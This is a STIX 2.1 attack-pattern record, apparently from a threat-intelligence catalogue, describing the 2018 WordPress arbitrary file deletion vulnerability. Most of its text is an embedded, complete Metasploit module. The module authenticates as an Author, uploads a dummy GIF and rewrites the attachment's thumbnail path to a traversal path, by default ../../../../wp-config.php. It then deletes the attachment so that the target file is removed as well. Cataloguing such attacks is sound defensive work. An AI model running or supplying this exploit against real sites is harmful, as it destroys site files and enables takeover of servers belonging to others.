{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9e23c42f-01ba-4296-ad28-3ddb2f374b0a",
    "created": "2024-08-14T16:29:30.307623Z",
    "modified": "2024-08-14T16:29:30.307627Z",
    "name": "Wordpress Arbitrary File Deletion",
    "description": "( An arbitrary file deletion vulnerability in the WordPress core allows any user with privileges of an Author to completely take over the WordPress site and to execute arbitrary code on the server. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_arbitrary_file_deletion.rb",
            "external_id": "wp_arbitrary_file_deletion.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "9100"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sonarsource.com/wordpress-file-delete-to-code-execution/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'Wordpress Arbitrary File Deletion',\n      'Description'    => %q(\n        An arbitrary file deletion vulnerability in the WordPress core allows any user with privileges of an\n        Author to completely take over the WordPress site and to execute arbitrary code on the server.\n      ),\n      'Author'         =>\n          [\n            'Slavco Mihajloski',   # Vulnerability discovery\n            'Karim El Ouerghemmi', # Vulnerability discovery\n            'Alo\u00efs Th\u00e9venot'       # Metasploit module\n          ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n          [\n            ['WPVDB', '9100'],\n            ['EDB', '44949'],\n            ['PACKETSTORM', '148333'],\n            ['URL', 'https://blog.sonarsource.com/wordpress-file-delete-to-code-execution/'],\n            ['URL', 'https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/']\n          ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'DisclosureDate' => '2018-06-26'\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),\n        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with']),\n        OptString.new('FILEPATH', [true, 'The path to the file to delete', '../../../../wp-config.php'])\n      ]\n    )\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def get_nonce(cookie)\n    res = send_request_cgi(\n      'method'  => 'GET',\n      'uri'     => normalize_uri(wordpress_url_backend, 'upload.php'),\n      'cookie'  => cookie\n    )\n\n    unless res && (res.code == 200)\n      fail_with(Failure::UnexpectedReply, \"Could not get the nonce (#{res.code})\")\n    end\n\n    res.body.scan(/\"_wpnonce\":\"([a-z0-9]+)\"/)[0][0].to_s\n  end\n\n  def run\n    vprint_status('Checking if target is online and running Wordpress...')\n    if wordpress_and_online?.nil?\n      fail_with(Failure::BadConfig, 'The target is not online and running Wordpress')\n    end\n    vprint_status('Checking access...')\n    cookie = wordpress_login(username, password)\n    if cookie.nil?\n      fail_with(Failure::BadConfig, 'Invalid credentials')\n    end\n    store_valid_credential(user: username, private: password, proof: cookie)\n\n    vprint_status('Getting the nonce...')\n    nonce = get_nonce(cookie)\n\n    vprint_status('Uploading media...')\n    data = Rex::MIME::Message.new\n    data.add_part(Rex::Text.decode_base64('R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs='), \"image/gif\", nil, \"form-data; name=\\\"async-upload\\\"; filename=\\\"a.gif\\\"\")\n    data.add_part(\"upload-attachment\", nil, nil, \"form-data; name=\\\"action\\\"\")\n    data.add_part(nonce, nil, nil, \"form-data; name=\\\"_wpnonce\\\"\")\n\n    post_data = data.to_s\n\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => normalize_uri(wordpress_url_backend, 'async-upload.php'),\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => post_data,\n      'cookie'  => cookie\n    )\n\n    unless res && (res.code == 200)\n      fail_with(Failure::UnexpectedReply, \"Could not upload the media (#{res.code})\")\n    end\n\n    json = JSON.parse(res.body)\n    id = json['data']['id']\n    update_nonce = json['data']['nonces']['update']\n    delete_nonce = json['data']['nonces']['delete']\n\n    vprint_status('Editing thumb path...')\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => normalize_uri(wordpress_url_backend, \"post.php?post=#{id}\"),\n      'cookie'  => cookie,\n      'vars_post' =>\n          {\n            'action' => 'editattachment',\n            '_wpnonce' => update_nonce,\n            'thumb' => datastore['FILEPATH']\n          }\n    )\n\n    unless res && (res.code == 302)\n      fail_with(Failure::UnexpectedReply, \"Could not edit media (#{res.code})\")\n    end\n\n    vprint_status('Deleting media...')\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),\n      'cookie'  => cookie,\n      'vars_post' =>\n          {\n            'action' => 'delete-post',\n            '_wpnonce' => delete_nonce,\n            'id' => id\n          }\n    )\n\n    unless res && (res.code == 200)\n      fail_with(Failure::UnexpectedReply, \"Could not delete media (#{res.code})\")\n    end\n\n    print_good('File deleted!')\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-06-26",
    "x_mitre_platforms": [
        "php'"
    ]
}